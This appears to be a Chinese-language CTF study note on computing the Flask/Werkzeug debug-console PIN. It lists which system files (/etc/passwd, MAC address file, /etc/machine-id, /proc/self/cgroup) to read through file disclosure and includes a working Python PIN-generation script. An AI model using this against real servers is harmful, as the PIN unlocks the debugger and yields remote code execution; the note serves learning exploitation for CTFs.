---
title: "Flask pin码计算"
date: 2024-11-01
---
# Flask pin码计算

## 参数

1. username        用户名(root/kali...)
2. modname        **flask.app**
3. `getattr(app, "__name__", app.__class__.__name__)`        **Flask**
4. `getattr(mod, "__file__",None)`        flask目录下的一个app.py的绝对路径
5. `str(uuid.getnode())`        mac地址十进制
6. get_machine_id()        机器码，根据操作系统不同，有四种获取方式

### username 用户名

`/etc/passwd`里可以看到用户名

`uuid>1000`一般是人为创建

### `app.py`的绝对路径

报错页面`/debug`泄露`app.py`的绝对路径

### mac地址

读取文件

```
centos
/sys/class/net/ens33/address

ubuntu
/sys/class/net/eth0/address
```

例题：

02:42:ac:11:00:02

直接输入计算器即可

## 机器码

```
/etc/machine-id #在前
b7471d41202f4da392a4743b37ea3b69

/proc/self/cgroup #docker 第一行最后一部分
0::/
```

## 计算代码

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'app',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py' 
]

private_bits = [
    '2485376911915',
    '7265fe765262551a676151a24c02b7b646a18828428b87e35c5482255b121e8f7464b02e50ffe3f1d626f8c05793f49a'# get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id
]   

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

```

